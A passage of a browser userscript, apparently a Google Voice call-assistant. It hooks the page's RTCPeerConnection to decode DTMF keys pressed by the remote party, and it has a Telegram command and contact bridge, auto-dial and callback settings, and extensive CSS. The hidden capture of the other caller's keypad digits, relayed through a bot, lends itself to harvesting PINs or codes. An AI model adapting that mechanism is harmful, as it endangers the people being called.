        // other, so reject when the imbalance exceeds these limits.
        const TWIST_BETWEEN_FWD_DB = 8.0;  // high group may be up to 8 dB stronger than low
        const TWIST_BETWEEN_REV_DB = 6.0;  // low group may be up to 6 dB stronger than high
        const HOLDDOWN_BLOCKS = 2;      // same digit on this many consecutive blocks before firing
        const SILENCE_BLOCKS  = 4;      // quiet blocks required before re-arming for a new press
        // 2nd-harmonic rejection, SPLIT by group. Real DTMF tones are near-pure sines,
        // but phone codecs + GV's audio pipeline introduce more 2nd-harmonic distortion
        // at the LOW frequencies (697-941 Hz) than the HIGH (1209-1633 Hz). Real-world
        // decoders apply a lenient low-group harmonic check and a strict high-group one.
        // Measured data confirms this: real low-group keys can show -10 dB 2nd harmonics
        // (e.g. digit "2" at 697 Hz) while still being clean tones, whereas the high
        // group is consistently -25 dB or deeper.
        // The COHERENCE gate (MIN_FREQ_RATIO) already does the heavy lifting against
        // speech, so these thresholds only need to add a purity check, not carry it.
        const MAX_HARMONIC_DB_LOW   = -8.0;   // low group: lenient (codec distortion tolerant)
        const MAX_HARMONIC_DB_HIGH  = -20.0;  // high group: strict
        // Diagnostic logging: prints measured ratios while a tone-like signal is present,
        // so detection can be tuned from real data. Off by default; flip to true to debug.
        const DTMF_DEBUG      = false;
        let _dtmfDbgLast = 0;

        // Raw (un-normalised) Goertzel power for one target frequency. The caller
        // normalises against total block energy to get a scale-invariant ratio.
        function goertzelPowerRaw(samples, sampleRate, targetFreq) {
            const N = samples.length;
            const k = targetFreq * N / sampleRate;
            const w = (2 * Math.PI * k) / N;
            const coeff = 2 * Math.cos(w);
            let s_prev = 0, s_prev2 = 0;
            for (let i = 0; i < N; i++) {
                const s = samples[i] + coeff * s_prev - s_prev2;
                s_prev2 = s_prev;
                s_prev = s;
            }
            return s_prev2 * s_prev2 + s_prev * s_prev - coeff * s_prev * s_prev2;
        }

        // Build the analysis graph for one incoming audio track and wire up decoding.
        function analyseTrack(track) {
            if (track.kind !== 'audio') return;

            // Lazy, shared AudioContext. GV calls follow a user gesture, so autoplay
            // policy is satisfied; resume() defensively in case it started suspended.
            if (!installDTMFHook._audioCtx) {
                const Ctx = pageWin.AudioContext || pageWin.webkitAudioContext;
                if (!Ctx) { console.log('[Call Helper] DTMF: no AudioContext available'); return; }
                installDTMFHook._audioCtx = new Ctx();
            }
            const ctx = installDTMFHook._audioCtx;
            if (ctx.state === 'suspended') { try { ctx.resume(); } catch (e) {} }

            // Tear down any previous graph so we don't stack listeners across calls.
            teardownGraph();

            const source = ctx.createMediaStreamSource(new MediaStream([track]));
            // ScriptProcessor is deprecated but reliably fires per-block with no
            // missed bursts -- better for tone detection than AnalyserNode polling.
            const sp = ctx.createScriptProcessor(2048, 1, 1);
            // Zero-gain GainNode ? destination keeps onaudioprocess firing WITHOUT
            // echoing the remote audio back out (silent passthrough).
            const mute = ctx.createGain();
            mute.gain.value = 0;
            source.connect(sp);
            sp.connect(mute);
            mute.connect(ctx.destination);

            // Per-call debounce state
            let candidate = null;   // digit waiting for HOLDDOWN confirmation
            let candidateCount = 0; // consecutive matching blocks for candidate
            let silenceCount = 0;   // quiet blocks since last tone
            let lastFired = null;   // last digit we actually emitted

            sp.onaudioprocess = (e) => {
                if (!isDtmfEnabled()) return;
                const input = e.inputBuffer.getChannelData(0);

                // Total signal energy = sum of squares. This is our scale reference:
                // every frequency's Goertzel power is expressed as a fraction of it,
                // which makes all thresholds independent of input level / mic gain.
                let energy = 0;
                for (let i = 0; i < input.length; i++) energy += input[i] * input[i];

                // RMS silence gate (energy/N then sqrt)
                const rms = Math.sqrt(energy / input.length);
                if (rms < RMS_GATE) {
                    silenceCount++;
                    // Once enough silence accumulates after a tone, re-arm for a new press.
                    // lastFired must also reset, otherwise two quick presses of the SAME key
                    // (e.g. "55") would only register once (second suppressed as a repeat).
                    if (silenceCount >= SILENCE_BLOCKS) { candidate = null; candidateCount = 0; lastFired = null; }
                    return;
                }

                // Per-frequency energy RATIO (scale-invariant). Guard against /0.
                const ref = energy > 1e-9 ? energy : 1e-9;
                const lowRatios = LOW_FREQS.map(f => goertzelPowerRaw(input, ctx.sampleRate, f) / ref);
                const highRatios = HIGH_FREQS.map(f => goertzelPowerRaw(input, ctx.sampleRate, f) / ref);

                // Strongest frequency in each group
                let lowIdx = 0;  lowRatios.forEach((r, i) => { if (r > lowRatios[lowIdx]) lowIdx = i; });
                let highIdx = 0; highRatios.forEach((r, i) => { if (r > highRatios[highIdx]) highIdx = i; });
                const lowRatio = lowRatios[lowIdx];
                const highRatio = highRatios[highIdx];

                // Diagnostic log: when something tone-like is heard, print the measured
                // ratios + 2nd-harmonic check ~3x/sec so thresholds can be tuned.
                if (DTMF_DEBUG && (lowRatio > 0.05 || highRatio > 0.05)) {
                    const now = Date.now();
                    if (now - _dtmfDbgLast > 350) {
                        _dtmfDbgLast = now;
                        const ref2 = energy > 1e-9 ? energy : 1e-9;
                        const lHarm = goertzelPowerRaw(input, ctx.sampleRate, LOW_FREQS[lowIdx] * 2) / ref2;
                        const hHarm = goertzelPowerRaw(input, ctx.sampleRate, HIGH_FREQS[highIdx] * 2) / ref2;
                        const lDb = lowRatio > 1e-9 ? 10 * Math.log10(lHarm / lowRatio) : 0;
                        const hDb = highRatio > 1e-9 ? 10 * Math.log10(hHarm / highRatio) : 0;
                        const fmt = a => a.map(r => r.toFixed(3)).join(',');
                        console.log('[DTMF dbg] rms=' + rms.toFixed(3),
                            'low=[' + fmt(lowRatios) + '] high=[' + fmt(highRatios) + ']',
                            'harmDb[L=' + lDb.toFixed(1) + ' H=' + hDb.toFixed(1) + ']',
                            '-> ' + DIGIT_GRID[lowIdx][highIdx]);
                    }
                }

                // A real DTMF tone concentrates a LOT of energy into its two freqs.
                // Require each winner to hold at least MIN_FREQ_RATIO of the block.
                if (lowRatio < MIN_FREQ_RATIO || highRatio < MIN_FREQ_RATIO) return;

                // Twist / dominance: within each group the winner must beat the
                // runner-up by >= TWIST_DB (rejects broadband speech/noise).
                if (!dominantInGroup(lowRatios, lowIdx)) return;
                if (!dominantInGroup(highRatios, highIdx)) return;

                // Between-group twist: the two DTMF tones of a real keypress are
                // power-balanced (within a few dB). Speech artifacts often have one
                // group vastly stronger than the other, so reject large imbalances.
                if (highRatio >= lowRatio) {
                    if (10 * Math.log10(highRatio / lowRatio) > TWIST_BETWEEN_FWD_DB) return;
                } else {
                    if (10 * Math.log10(lowRatio / highRatio) > TWIST_BETWEEN_REV_DB) return;
                }

                // 2nd-harmonic purity test -- the discriminator vs speech/music/voicemail.
                // Uses SPLIT thresholds: lenient for the low group (codec distortion),
                // strict for the high group. The COHERENCE gate above already rejects
                // single-formant speech, so this only needs to add a purity check.
                const lowFund = LOW_FREQS[lowIdx];
                const highFund = HIGH_FREQS[highIdx];
                if (!isPureTone(input, ctx.sampleRate, lowFund, lowRatio, energy, MAX_HARMONIC_DB_LOW)) return;
                if (!isPureTone(input, ctx.sampleRate, highFund, highRatio, energy, MAX_HARMONIC_DB_HIGH)) return;

                const digit = DIGIT_GRID[lowIdx][highIdx];
                silenceCount = 0;

                if (digit === candidate) {
                    candidateCount++;
                } else {
                    candidate = digit;
                    candidateCount = 1;
                }

                // Fire once after the tone is held long enough; suppress repeats of
                // the same held key until a quiet gap resets it.
                if (candidateCount === HOLDDOWN_BLOCKS && digit !== lastFired) {
                    lastFired = digit;
                    dtmfBridge.push(digit);
                }
            };

            installDTMFHook._graph = { source, sp, mute, track };

            track.addEventListener('ended', teardownGraph);
            track.addEventListener('mute', () => { /* track muted: leave graph, will teardown on ended */ });

            dtmfBridge.setActive(true);
        }

        // Returns true if the ratio at `winIdx` dominates its group by TWIST_DB.
        // Operates on the precomputed ratio arrays (scale-invariant).
        function dominantInGroup(ratios, winIdx) {
            const winR = ratios[winIdx];
            for (let i = 0; i < ratios.length; i++) {
                if (i === winIdx) continue;
                const r = ratios[i];
                if (winR < r) return false;
                // dB margin: 10*log10(winR/r) must exceed TWIST_DB
                if (r > 1e-9 && 10 * Math.log10(winR / r) < TWIST_DB) return false;
            }
            return true;
        }

        // 2nd-harmonic purity test (ITU-T Q.24 style). Returns true if `fundFreq`
        // looks like a near-pure sine -- i.e. its 2nd harmonic is sufficiently
        // suppressed relative to the fundamental. `fundRatio` is the fundamental's
        // energy ratio (already computed); `energy` is the block's total energy
        // (already computed); `maxDb` is the group-specific threshold to apply.
        function isPureTone(samples, sampleRate, fundFreq, fundRatio, energy, maxDb) {
            if (fundRatio < 1e-9) return false;
            const ref = energy > 1e-9 ? energy : 1e-9;
            const harmRatio = goertzelPowerRaw(samples, sampleRate, fundFreq * 2) / ref;
            // harmonicDb = 10*log10(harmRatio / fundRatio); must be <= maxDb
            // (e.g. -20dB means the 2nd harmonic is at least 20dB below the fundamental).
            const harmonicDb = 10 * Math.log10(harmRatio / fundRatio);
            return harmonicDb <= maxDb;
        }

        function teardownGraph() {
            const g = installDTMFHook._graph;
            if (!g) return;
            try { g.sp.onaudioprocess = null; } catch (e) {}
            try { g.source.disconnect(); } catch (e) {}
            try { g.sp.disconnect(); } catch (e) {}
            try { g.mute.disconnect(); } catch (e) {}
            installDTMFHook._graph = null;
            installDTMFHook._trackId = null; // allow the next call's track to reset
            dtmfBridge.setActive(false);
        }

        // ---- Wrap the page RTCPeerConnection ----
        function WrappedRTC(config, constraints) {
            const pc = new NativeRTC(config, constraints);

            pc.addEventListener('track', (event) => {
                // Each 'track' with kind 'audio' is the REMOTE (incoming) track.
                if (event.track && event.track.kind === 'audio') {
                    // GV can fire multiple 'track' events per call (renegotiation,
                    // stereo split, etc.). Only reset+rebuild when it's genuinely a
                    // NEW track, otherwise we'd wipe digits mid-call on every re-fire.
                    const tid = event.track.id;
                    if (installDTMFHook._trackId === tid) {
                        console.log('[Call Helper] DTMF: same track re-fired (' + tid + '), ignoring');
                        return;
                    }
                    installDTMFHook._trackId = tid;
                    console.log('[Call Helper] DTMF: new incoming audio track (' + tid + ') :: resetting & analysing');
                    dtmfBridge.reset();
                    analyseTrack(event.track);
                }
            });

            // If the peer connection dies (call ended, network failure), clean up.
            pc.addEventListener('iceconnectionstatechange', () => {
                try {
                    const st = pc.iceConnectionState;
                    if (st === 'closed' || st === 'failed' || st === 'disconnected') {
                        teardownGraph();
                    }
                } catch (e) {}
            });

            return pc;
        }

        // Keep the native prototype + static props so GV code using instanceof /
        // generateCertificate / etc. still works.
        WrappedRTC.prototype = NativeRTC.prototype;
        try {
            WrappedRTC.prototype.constructor = WrappedRTC;
        } catch (e) {}
        if (NativeRTC.generateCertificate) {
            WrappedRTC.generateCertificate = NativeRTC.generateCertificate.bind(NativeRTC);
        }

        pageWin.RTCPeerConnection = WrappedRTC;
        if (pageWin.webkitRTCPeerConnection) pageWin.webkitRTCPeerConnection = WrappedRTC;

        console.log('[Call Helper] DTMF: RTCPeerConnection hook installed');
        logToBot('dtmf', 'RTCPeerConnection hook installed');
    }

    function initCallHelper() {
        const DEBUG = false;
        const log = (...args) => { if (DEBUG) console.log('Call Helper:', ...args); };

        const DEFAULT_SETTINGS = {
            darkMode: false,
            minimized: false,
            autoDialEnabled: false,
            selectedTimezone: 'America/New_York',
            keybinds: { redial: 'q', callNext: 'w', hangup: 'e' },
            // Auto-queue settings
            autoQueueEnabled: false,
            autoQueueMode: 'auto' // 'auto' = add silently, 'prompt' = ask each time
        };
        // DTMF detection is on by default; the early RTC hook reads this via getShared.
        DEFAULT_SETTINGS.dtmfEnabled = true;

        let settings = { ...DEFAULT_SETTINGS, ...getShared('helperSettings', {}) };
        if (settings.autoQueueEnabled === undefined) settings.autoQueueEnabled = false;
        if (!settings.autoQueueMode) settings.autoQueueMode = 'auto';
        if (settings.dtmfEnabled === undefined) settings.dtmfEnabled = true;
        const saveSettings = () => setShared('helperSettings', settings);

        const NOTIFICATION_SOUND_URL = 'https://actions.google.com/sounds/v1/alarms/beep_short.ogg';

        // Communication state
        let telegramConnected = false;
        let lastCommandId = 0;

        function sendCommand(command) {
            lastCommandId = Date.now();
            setShared('pendingCommand', { id: lastCommandId, command, timestamp: Date.now(), status: 'pending' });
            console.log('[Call Helper] Command queued:', command);
        }

        function checkTelegramResponse() {
            const response = getShared('commandResponse', {});
            if (response.id === lastCommandId && response.status) {
                if (response.status === 'sent') {
                    showMessage('Sent', 1500);
                } else if (response.status === 'failed') {
                    showMessage('Failed: ' + (response.reason || 'unknown'), 2500);
                }
                setShared('commandResponse', {});
                lastCommandId = 0;
            }

            const heartbeat = getShared('telegramHeartbeat', {});
            const wasConnected = telegramConnected;
            telegramConnected = heartbeat.timestamp && (Date.now() - heartbeat.timestamp < 10000);
            if (telegramConnected !== wasConnected) {
                updateTelegramStatus();
                if (telegramConnected) console.log('[Call Helper] Telegram Bridge connected!');
            }
        }

        function checkIncomingContacts() {
            const incoming = getShared('incomingContact', {});
            if (incoming.timestamp && incoming.data && !incoming.processed) {
                console.log('[Call Helper] Received contact from Telegram:', incoming);
                handleIncomingContact(incoming.data, incoming.source);
                incoming.processed = true;
                setShared('incomingContact', incoming);
            }
        }

        setInterval(checkTelegramResponse, 500);
        setInterval(checkIncomingContacts, 1000);

        // Preconnect so the display face lands before first paint.
        whenReady(() => {
            ['https://fonts.gstatic.com'].forEach(href => {
                if (document.querySelector(`link[href="${href}"]`)) return;
                const link = document.createElement('link');
                link.rel = 'preconnect';
                link.href = href;
                link.crossOrigin = 'anonymous';
                document.head.appendChild(link);
            });
        });

        // Styles - READABLE VERSION
        GM_addStyle(`
            @font-face { font-family:'Coral Pixels'; font-style:normal; font-weight:400; font-display:swap; src:url('https://fonts.gstatic.com/s/coralpixels/v1/qWctB66zpZ3zAtrlR8Mb1LyCfxz-.woff2') format('woff2'); unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD; }
            @font-face { font-family:'Coral Pixels'; font-style:normal; font-weight:400; font-display:swap; src:url('https://fonts.gstatic.com/s/coralpixels/v1/qWctB66zpZ3zAtrlR8Mb1LyCcRz-ijA.woff2') format('woff2'); unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF; }
            /* ============================================================
               SWISS / INTERNATIONAL TYPOGRAPHIC STYLE
               Flat surfaces, type-led hierarchy, restrained palette,
               hairline dividers, tabular figures. No emoji chrome.
               ============================================================ */
            :root {
                /* Lesbian flag: #D52D00 orange, #FF9E56 light orange,
                   #FFFFFF white, #D362A4 pink, #A30262 dark pink */
                --ch-flag-orange:#D52D00; --ch-flag-peach:#FF9E56; --ch-flag-white:#FFFFFF; --ch-flag-pink:#D362A4; --ch-flag-deep:#A30262; --ch-flag-ink:#3B0720;
                --ch-bg:#FFFFFF; --ch-bg-secondary:#FFF4EC; --ch-bg-tertiary:#FFE7DA;
                --ch-text:#3B0720; --ch-text-secondary:#8A3A63; --ch-text-muted:#B0849E;
                --ch-border:#F0C9DC; --ch-border-light:#FAE6EF;
                --ch-primary:#A30262; --ch-primary-hover:#7C014B;
                --ch-accent:#D362A4; --ch-accent-soft:rgba(211,98,164,0.16);
                --ch-success:#D52D00; --ch-danger:#A30262; --ch-warning:#FF9E56;
                --ch-shadow:rgba(163,2,98,0.10); --ch-shadow-lg:rgba(163,2,98,0.22);
                --ch-bg-tint:rgba(255,255,255,0.70); --ch-bg-secondary-tint:rgba(255,244,236,0.70); --ch-bg-tertiary-tint:rgba(255,231,218,0.72);
                --ch-panel-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTTWSkLYKqNLRQNQ_DqYSu28uaug2HSOKerfm9BwORvlg&s=10');
                --ch-panel-image-opacity:0.35;
                --ch-radius:10px; --ch-radius-sm:6px;
                --ch-font:'Coral Pixels',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
                --ch-mono:ui-monospace,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
                --ch-label:11px; --ch-track:0.1em;
            }
            .dark-mode {
                --ch-bg:#2A0716; --ch-bg-secondary:#3A0C22; --ch-bg-tertiary:#4A1130;
                --ch-bg-tint:rgba(42,7,22,0.74); --ch-bg-secondary-tint:rgba(58,12,34,0.74); --ch-bg-tertiary-tint:rgba(74,17,48,0.76);
                --ch-text:#FFF3F7; --ch-text-secondary:#E7A9C8; --ch-text-muted:#A9708F;
                --ch-border:#551338; --ch-border-light:#47102E;
                --ch-primary:#FF9E56; --ch-primary-hover:#FFB77C;
                --ch-accent:#D362A4; --ch-accent-soft:rgba(211,98,164,0.18);
                --ch-success:#D52D00; --ch-danger:#A30262; --ch-warning:#FF9E56;
                --ch-shadow:rgba(0,0,0,0.45); --ch-shadow-lg:rgba(0,0,0,0.6);
            }

            /* ---- Panel shell ---- */
            #callHelperPanel { position:fixed;top:80px;right:20px;width:420px;z-index:9999;background:var(--ch-bg-tint);border:1px solid var(--ch-border);border-radius:var(--ch-radius);box-shadow:0 1px 2px var(--ch-shadow),0 12px 36px var(--ch-shadow-lg);font-family:var(--ch-font);overflow:hidden;font-size:13px;color:var(--ch-text);-webkit-font-smoothing:antialiased; }
            #callHelperPanel::before { content:'';position:absolute;top:0;left:0;right:0;bottom:0;width:100%;height:100%;box-sizing:border-box;z-index:0;pointer-events:none;background-image:var(--ch-panel-image);background-size:contain;background-position:center center;background-repeat:no-repeat;opacity:var(--ch-panel-image-opacity); }
            #callHelperPanel > * { position:relative;z-index:1; }
            #callHelperPanel.minimized { width:200px; }
            #callHelperPanel.minimized .call-helper-content, #callHelperPanel.minimized #callbackList, #callHelperPanel.minimized #statsView { display:none!important; }
            #callHelperPanel * { box-sizing:border-box; }

            /* ---- Header (solid, no gradient) ---- */
            #callHelperHeader { display:flex;align-items:center;justify-content:space-between;padding:13px 16px;background:var(--ch-bg-tint);border-bottom:1px solid var(--ch-border);cursor:move;user-select:none; }
            .header-title { font-weight:600;font-size:12px;letter-spacing:var(--ch-track);text-transform:uppercase;color:var(--ch-text);display:flex;align-items:center;gap:9px; }
            .skid-tag { font-size:9px;font-weight:500;letter-spacing:0.06em;color:var(--ch-text-muted);text-transform:none;font-style:italic; }
            .header-controls { display:flex;gap:4px; }
            .header-btn { background:transparent;border:1px solid transparent;color:var(--ch-text-secondary);height:26px;min-width:26px;padding:0 8px;border-radius:var(--ch-radius-sm);cursor:pointer;font-size:11px;font-weight:500;letter-spacing:0.02em;display:flex;align-items:center;justify-content:center;transition:all 0.12s ease;font-family:var(--ch-font); }
            .header-btn:hover { background:var(--ch-bg-secondary);color:var(--ch-text); }
            .telegram-status { width:7px;height:7px;border-radius:50%;background:var(--ch-text-muted); }
            .telegram-status.connected { background:var(--ch-success); }

            /* ---- Content + inputs ---- */
            .call-helper-content { padding:16px; }
            .call-helper-content textarea { width:100%;padding:10px 12px;font-size:13px;border:1px solid var(--ch-border);border-radius:var(--ch-radius-sm);background:var(--ch-bg);color:var(--ch-text);resize:vertical;min-height:60px;margin-bottom:10px;font-family:var(--ch-font);transition:border-color 0.12s ease; }
            .call-helper-content textarea:focus { outline:none;border-color:var(--ch-text); }

            /* ---- Buttons: flat, still hover (no lift) ---- */
            .helper-button { width:100%;padding:11px 16px;font-size:12px;font-weight:600;letter-spacing:0.04em;text-transform:uppercase;border:none;border-radius:var(--ch-radius-sm);cursor:pointer;transition:background 0.12s ease,border-color 0.12s ease,color 0.12s ease;margin-bottom:8px;font-family:var(--ch-font); }
            .helper-button:active { opacity:0.85; }
            .btn-primary { background:var(--ch-primary);color:var(--ch-bg); }
            .btn-primary:hover { background:var(--ch-primary-hover); }
            .btn-success { background:var(--ch-success);color:#fff; }
            .btn-success:hover { filter:brightness(1.08); }
            .btn-danger { background:var(--ch-danger);color:#fff; }
            .btn-danger:hover { filter:brightness(1.08); }
            .btn-secondary { background:transparent;color:var(--ch-text);border:1px solid var(--ch-border); }
            .btn-secondary:hover { border-color:var(--ch-text); }
            .btn-warning { background:var(--ch-warning);color:#fff; }
            .btn-warning:hover { filter:brightness(1.08); }
            .btn-small { padding:7px 12px;font-size:11px;width:auto;margin-bottom:0; }
            .btn-flash { animation:btnFlash 0.18s ease; }
            @keyframes btnFlash { 0%{transform:scale(1)}50%{transform:scale(0.97);opacity:0.85}100%{transform:scale(1)} }

            /* ---- Bulk session controls ---- */
            .bulk-session-controls { display:flex;gap:10px;margin:14px 0; }
            .control-wrapper { flex:1;display:flex;flex-direction:column;align-items:center; }
            .control-wrapper .helper-button { width:100%;margin-bottom:0;padding:13px 8px;font-size:12px; }
            .key-hint { display:inline-flex;align-items:center;justify-content:center;min-width:24px;height:18px;padding:0 6px;font-size:10px;font-weight:600;letter-spacing:0.08em;text-transform:uppercase;background:var(--ch-bg-tertiary-tint);color:var(--ch-text-muted);border:1px solid var(--ch-border);border-radius:3px;margin-top:6px;font-family:var(--ch-mono); }

            /* ---- Info rows (label: value, tabular) ---- */
            .helper-info-item { display:flex;margin-bottom:6px;font-size:13px;line-height:1.4;color:var(--ch-text); }
            .helper-info-item strong { flex-shrink:0;width:64px;color:var(--ch-text-secondary);font-weight:500;font-size:11px;letter-spacing:0.06em;text-transform:uppercase;padding-top:2px; }

            /* ---- Disposition buttons ---- */
            .disposition-controls { display:flex;gap:6px;margin:12px 0; }
            .dispo-btn { flex:1;padding:9px 6px;font-size:10px;font-weight:600;letter-spacing:0.06em;text-transform:uppercase;border-radius:var(--ch-radius-sm);border:1px solid var(--ch-border);background:transparent;color:var(--ch-text);cursor:pointer;transition:all 0.12s ease;font-family:var(--ch-font); }
            .dispo-btn:hover { border-color:var(--ch-text); }
            .dispo-btn:active { background:var(--ch-bg-secondary); }
            .dispo-btn.clicked { background:var(--ch-success);color:#fff;border-color:var(--ch-success); }

            /* ---- Callback scheduler ---- */
            .callback-scheduler { margin-top:14px;padding-top:14px;border-top:1px solid var(--ch-border-light); }
            .scheduler-row { display:flex;gap:8px;margin-bottom:10px; }
            .scheduler-row input, .scheduler-row select, .scheduler-row textarea { flex:1;padding:9px 11px;font-size:12px;border:1px solid var(--ch-border);border-radius:var(--ch-radius-sm);background:var(--ch-bg);color:var(--ch-text);font-family:var(--ch-font); }
            .scheduler-row input:focus, .scheduler-row select:focus { outline:none;border-color:var(--ch-text); }
            .callback-notes { width:100%;min-height:36px;resize:vertical;box-sizing:border-box; }

            /* ---- Callback list ---- */
            #callbackList { padding:14px 16px;border-top:1px solid var(--ch-border);max-height:180px;overflow-y:auto; }
            #callbackList h3 { margin:0 0 10px 0;font-size:11px;font-weight:600;letter-spacing:var(--ch-track);text-transform:uppercase;color:var(--ch-text-secondary); }
            .callback-item { background:var(--ch-bg-secondary-tint);border:1px solid var(--ch-border-light);border-left:2px solid var(--ch-accent);border-radius:var(--ch-radius-sm);padding:10px 12px;margin-bottom:8px;font-size:12px; }
            .callback-name { font-weight:600;color:var(--ch-text); }
            .callback-countdown { font-size:11px;font-weight:600;color:var(--ch-danger);font-variant-numeric:tabular-nums; }
            .callback-details { color:var(--ch-text-secondary);line-height:1.4;margin-top:4px;font-variant-numeric:tabular-nums; }
            .callback-notes-display { margin-top:6px;padding:6px 9px;background:var(--ch-bg-tint);border-radius:4px;font-style:italic;font-size:11px;color:var(--ch-text-secondary); }

            /* ---- Stats ---- */
            #statsView { padding:14px 16px;background:var(--ch-bg-secondary-tint);border-top:1px solid var(--ch-border); }
            #statsView h3 { margin:0 0 10px 0;font-size:11px;font-weight:600;letter-spacing:var(--ch-track);text-transform:uppercase;color:var(--ch-text-secondary);text-align:center; }
            .stats-grid { display:grid;grid-template-columns:repeat(3,1fr);gap:6px; }
            .stat-cell { text-align:center;padding:10px 4px;background:var(--ch-bg-tint);border:1px solid var(--ch-border-light);border-radius:var(--ch-radius-sm); }
            .stat-number { font-size:20px;font-weight:700;color:var(--ch-text);font-variant-numeric:tabular-nums;line-height:1; }
            .stat-label { font-size:9px;text-transform:uppercase;letter-spacing:0.08em;color:var(--ch-text-muted);font-weight:600;margin-top:4px;display:block; }

            /* ---- Settings panel ---- */
            #settingsPanel { display:none;padding:16px;border-top:1px solid var(--ch-border);max-height:450px;overflow-y:auto;background:var(--ch-bg-tint); }
            #settingsPanel.visible { display:block; }
            .settings-group { margin-bottom:18px;padding-bottom:16px;border-bottom:1px solid var(--ch-border-light); }
            .settings-group:last-child { border-bottom:none;margin-bottom:0;padding-bottom:0; }
            .settings-group-title { font-size:11px;font-weight:600;letter-spacing:var(--ch-track);text-transform:uppercase;color:var(--ch-text);margin-bottom:12px;display:flex;align-items:center;gap:8px; }
            .settings-group label { display:block;font-size:11px;font-weight:500;letter-spacing:0.04em;text-transform:uppercase;color:var(--ch-text-secondary);margin-bottom:5px; }
            .settings-row { display:flex;align-items:center;gap:10px;margin-bottom:8px; }
            .settings-row input[type="text"] { flex:1;padding:8px 10px;font-size:13px;border:1px solid var(--ch-border);border-radius:var(--ch-radius-sm);background:var(--ch-bg);color:var(--ch-text);font-family:var(--ch-font); }
            .settings-row input[type="text"]:focus { outline:none;border-color:var(--ch-text); }
            .settings-row input[type="text"].key-input { width:50px;flex:none;text-align:center;text-transform:uppercase;font-weight:600;font-family:var(--ch-mono); }
            .settings-row span { font-size:12px;color:var(--ch-text);min-width:70px; }
            .settings-row select { flex:1;padding:8px 10px;font-size:12px;border:1px solid var(--ch-border);border-radius:var(--ch-radius-sm);background:var(--ch-bg);color:var(--ch-text);font-family:var(--ch-font); }

            /* ---- Toggles ---- */
            .toggle-row { display:flex;align-items:center;justify-content:space-between;padding:8px 0; }
            .toggle-row span { font-size:13px;color:var(--ch-text); }
            .toggle-switch { position:relative;width:36px;height:20px;background:var(--ch-border);border-radius:10px;cursor:pointer;transition:background 0.2s ease;flex-shrink:0; }
            .toggle-switch.active { background:var(--ch-text); }
            .toggle-switch::after { content:'';position:absolute;top:2px;left:2px;width:16px;height:16px;background:var(--ch-bg);border-radius:50%;transition:transform 0.2s ease;box-shadow:0 1px 2px rgba(0,0,0,0.25); }
            .toggle-switch.active::after { transform:translateX(16px);background:var(--ch-bg); }

            /* ---- Misc ---- */
            .helper-actions { display:flex;align-items:center;gap:10px;margin-top:10px;flex-wrap:wrap; }
            .helper-actions label { font-size:12px;color:var(--ch-text);cursor:pointer;display:flex;align-items:center;gap:6px; }
            #bulkSessionView { background:var(--ch-bg-secondary-tint);border-radius:var(--ch-radius-sm);display:none; }
            #bulkSessionView.active { display:block;padding:14px; }
            #bulkSessionStatus { font-size:12px;font-weight:600;letter-spacing:0.04em;text-transform:uppercase;text-align:center;padding:12px;color:var(--ch-text-secondary);background:var(--ch-bg-tint);border:1px solid var(--ch-border-light);border-radius:var(--ch-radius-sm);margin-bottom:12px; }
            #helperSuccessMessage { text-align:center;font-size:12px;font-weight:500;color:var(--ch-success);min-height:18px;margin:8px 0; }
            .queue-indicator { background:var(--ch-bg-secondary-tint);border:1px solid var(--ch-border-light);border-radius:var(--ch-radius-sm);padding:10px 14px;margin-bottom:12px;display:flex;align-items:center;justify-content:space-between;font-size:13px;cursor:pointer;transition:all 0.12s ease; }
            .queue-indicator:hover { border-color:var(--ch-text-muted); }
            .queue-count { font-weight:700;color:var(--ch-text);font-size:15px;font-variant-numeric:tabular-nums; }

            /* ---- Modal ---- */
            .modal-overlay { position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(17,17,17,0.5);z-index:100000;display:flex;align-items:center;justify-content:center; }
            .modal-content { background:var(--ch-bg);border:1px solid var(--ch-border);border-radius:var(--ch-radius);padding:22px;min-width:320px;max-width:400px;box-shadow:0 24px 64px var(--ch-shadow-lg); }
            .modal-title { font-size:14px;font-weight:600;color:var(--ch-text);margin-bottom:16px;letter-spacing:0.02em; }
            .modal-field { margin-bottom:14px; }
            .modal-field label { display:block;font-size:11px;font-weight:500;letter-spacing:0.06em;text-transform:uppercase;color:var(--ch-text-secondary);margin-bottom:5px; }
            .modal-field input { width:100%;padding:10px 12px;font-size:14px;border:1px solid var(--ch-border);border-radius:var(--ch-radius-sm);background:var(--ch-bg);color:var(--ch-text);box-sizing:border-box;font-family:var(--ch-font); }
            .modal-field input:focus { outline:none;border-color:var(--ch-text); }
            .modal-actions { display:flex;gap:10px;margin-top:16px; }
            .modal-actions button { flex:1; }
            @keyframes pulse { 0%,100%{opacity:1}50%{opacity:0.7} }
            .incoming-contact-alert .source { font-size:11px;opacity:0.9; }
            .incoming-contact-alert .preview { font-weight:600;margin-top:4px; }
            #timezone-selector-container { margin-top:10px; }
            #timezone-selector-container label { display:block;font-size:11px;font-weight:500;letter-spacing:0.06em;text-transform:uppercase;color:var(--ch-text-secondary);margin-bottom:4px; }
            #timezone-selector { width:100%;padding:9px 11px;font-size:12px;border:1px solid var(--ch-border);border-radius:var(--ch-radius-sm);background:var(--ch-bg);color:var(--ch-text);font-family:var(--ch-font); }
            #timezone-selector:focus { outline:none;border-color:var(--ch-text); }

            /* ---- Callback alert popup ---- */
            #callbackAlertPopup { position:fixed;top:100px;left:50%;transform:translateX(-50%);width:340px;z-index:10001;background:var(--ch-bg);border:1px solid var(--ch-warning);border-radius:var(--ch-radius);box-shadow:0 24px 64px var(--ch-shadow-lg);display:none;overflow:hidden; }
            #callbackAlertPopup.alert-due { border-color:var(--ch-danger); }
            #callbackAlertHeader { padding:14px 16px;background:var(--ch-warning);color:#fff;font-weight:600;font-size:12px;letter-spacing:0.06em;text-transform:uppercase;text-align:center; }
            #callbackAlertPopup.alert-due #callbackAlertHeader { background:var(--ch-danger);color:#fff; }
